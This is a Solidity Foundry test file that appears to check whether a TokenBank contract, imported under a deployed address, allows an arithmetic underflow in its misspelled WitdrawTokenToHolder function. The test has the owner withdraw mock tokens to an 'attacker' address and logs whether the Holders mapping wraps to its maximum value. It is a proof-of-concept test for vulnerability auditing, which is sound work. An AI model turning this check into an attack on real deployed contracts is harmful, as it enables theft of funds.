// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x8fd1e427396ddb511533cf9abdbebd0a7e08da35.sol";

contract TokenBankTest is Test {
    TokenBank tokenBank;
    MockERC20 token;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    uint256 constant TOKEN_AMOUNT = 100 ether;

    function setUp() public {
        vm.startPrank(owner);
        tokenBank = new TokenBank();
        token = new MockERC20();
        token.mint(address(tokenBank), TOKEN_AMOUNT);
        vm.stopPrank();
    }

    function test_WithdrawTokenToHolder_ArithmeticUnderflow() public {
        console2.log("--- BEFORE-Trigger State ---");
        uint256 holdersBefore = tokenBank.Holders(attacker);
        uint256 attackerTokenBalanceBefore = token.balanceOf(attacker);
        console2.log("Holders[attacker] before: %s", holdersBefore);
        console2.log("Attacker token balance before: %s", attackerTokenBalanceBefore);

        console2.log("--- Trigger WithdrawTokenToHolder ---");
        vm.startPrank(owner);
        bool noRevert;
        try tokenBank.WitdrawTokenToHolder(attacker, address(token), 10 ether) {
            noRevert = true;
        } catch {
            noRevert = false;
        }
        vm.stopPrank();

        console2.log("--- AFTER-Trigger State ---");
        uint256 holdersAfter = tokenBank.Holders(attacker);
        uint256 attackerTokenBalanceAfter = token.balanceOf(attacker);
        console2.log("Holders[attacker] after: %s", holdersAfter);
        console2.log("Attacker token balance after: %s", attackerTokenBalanceAfter);

        if (noRevert && holdersAfter == type(uint256).max && attackerTokenBalanceAfter == attackerTokenBalanceBefore + 10 ether) {
            console2.log("Vulnerability Exists: Underflow allowed without revert. Holders mapping underflowed and tokens transferred to attacker.");
        } else if (!noRevert) {
            console2.log("Vulnerability not Exist: Call reverted due to safe arithmetic handling.");
        } else {
            console2.log("Vulnerability not Exist: Unexpected state change after exploit attempt.");
        }
    }
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}